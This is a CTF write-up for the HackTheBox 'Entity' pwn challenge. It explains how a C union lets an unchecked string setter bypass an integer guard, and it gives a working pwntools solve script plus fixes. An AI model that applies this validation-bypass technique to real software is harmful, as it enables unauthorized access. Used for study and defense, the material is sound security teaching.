## Overview

`Entity` is a Very Easy HackTheBox **Pwn** challenge, but there is no overflow, no leak, and no ROP. The whole bug is a [type confusion](https://cwe.mitre.org/data/definitions/843.html): a C `union` lets a value-checked integer field and an *unchecked* byte buffer share the same 8 bytes of storage. The flag is gated on the integer equalling a magic constant, the integer setter refuses that constant — so we just set those bytes through the string setter, which never checks anything.

## The technique

A `union` stores all of its members at the **same address**. Validate a value when it's written as one member, and you've validated nothing about the bytes if an attacker writes them through a different member. The guard only ever inspected one interpretation of the storage.

```c
static union {
    unsigned long long integer;   // these two share the SAME 8 bytes
    char string[8];
} DataStore;

void set_field(field_t f) {
    char buf[32] = {0};
    fgets(buf, sizeof(buf), stdin);
    switch (f) {
    case INTEGER:
        sscanf(buf, "%llu", &DataStore.integer);
        if (DataStore.integer == 13371337) { exit(-1); }  // guard — INTEGER path only
        break;
    case STRING:
        memcpy(DataStore.string, buf, sizeof(DataStore.string));  // no value check
        break;
    }
}

void get_flag() {
    if (DataStore.integer == 13371337) { system("cat flag.txt"); exit(0); }
}
```

`get_flag()` needs `DataStore.integer == 13371337`. The INTEGER setter rejects exactly that number. The STRING setter copies 8 raw bytes into the *same* storage with no check — and the flag check reads those bytes back as the integer.

## Solution

`13371337 == 0x00CC07C9`, which as 8 little-endian bytes is `c9 07 cc 00 00 00 00 00` — exactly what `pwntools`' `p64(13371337)` produces. Send that down the STRING path, then ask for the flag.

```python
#!/usr/bin/env python3
import sys
from pwn import *

io = remote(*sys.argv[1].split(":")) if len(sys.argv) > 1 else process("./entity")

payload = p64(13371337)  # 0x00CC07C9 little-endian; no newline inside the first 8 bytes

io.sendlineafter(b">> ", b"T")        # (T)ry to turn it off -> STORE_SET
io.sendlineafter(b">> ", b"S")        # (S)cream             -> STRING field
io.sendlineafter(b">> ", payload)     # memcpy writes union.integer = 13371337
io.sendlineafter(b">> ", b"C")        # (C)ry -> get_flag()  -> integer matches

print(io.recvall(timeout=3).decode("latin1", "replace"))   # HTB{...}
```

```
$ python3 solve.py <host>:<port>
HTB{...}
```

A small but important detail: the magic value contains interior `0x00` bytes. `fgets` stops at a newline, **not** at a NUL, so the embedded zeros copy through fine — you only have to make sure the `\n` doesn't land inside the first 8 copied bytes. `p64(13371337)` already ends in zeros, so the trailing newline sits at byte 8 and is harmless.

## Why it worked

The author validated the value on the write path they expected an attacker to use (the INTEGER setter) and overlooked that the `union` aliases the same memory through an unvalidated path (the STRING setter). The security check guarded one *view* of the bytes while the flag check read another.

## Fix / defense

- Don't overlap differently-validated fields in a `union` — give each field its own storage with a `struct`.
- Or keep the `union` but **re-validate the canonical value at the point of use, and on every writer** — e.g. repeat `if (DataStore.integer == 13371337) exit(-1);` after the STRING `memcpy` too.
- General rule: a security check must guard the interpretation that actually gates the action, on every path that can reach it.
